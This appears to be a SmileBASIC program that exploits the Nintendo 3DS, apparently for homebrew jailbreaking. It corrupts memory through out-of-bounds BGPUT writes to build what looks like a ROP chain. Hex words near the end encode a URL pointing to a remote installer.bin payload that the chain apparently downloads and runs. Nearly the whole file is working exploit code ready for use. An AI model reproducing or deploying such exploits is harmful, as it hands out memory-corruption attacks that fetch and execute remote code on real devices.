OA$="<INSERT OTHERAPP HERE>"
BGSCREEN 0,1073741824,2
B0=BGGET(0,33358,0)
B1=BGGET(0,33358,1)
B=((B1 OR (B0 << 16))+160)/4
DEF W A,V
  BGPUT 0,A+38879171-B,0,V>>16
  BGPUT 0,A+38879171-B,1,V
END

W 0,&H1340EC
W 1,&H400000
W 2,&H1039BF
W 3,&H945000C
W 4,&H1
W 8,&H1CC388
W 16,&H1045D4
W 19,&H1340EC
W 20,&H400000
W 21,&H255DD4
W 23,&H1340EC
W 24,&H400000
W 25,&H1039BF
W 26,&H30010000
W 27,&H800
W 31,&H1CD034
W 33,&H1340EC
W 34,&H30010000
W 35,&H1F5054
W 36,&H104450
W 37,&H1340F0

W 64,&H70747468
W 65,&H732F2F3A
W 66,&H6C61656D
W 67,&H672E6D75
W 68,&H75687469
W 69,&H6F692E62
W 70,&H7364332F
W 71,&H6F2F732F
W 72,&H755F646C
W 73,&H33336173
W 74,&H6E692F31
W 75,&H6C617473
W 76,&H2E72656C
W 77,&H6E6962
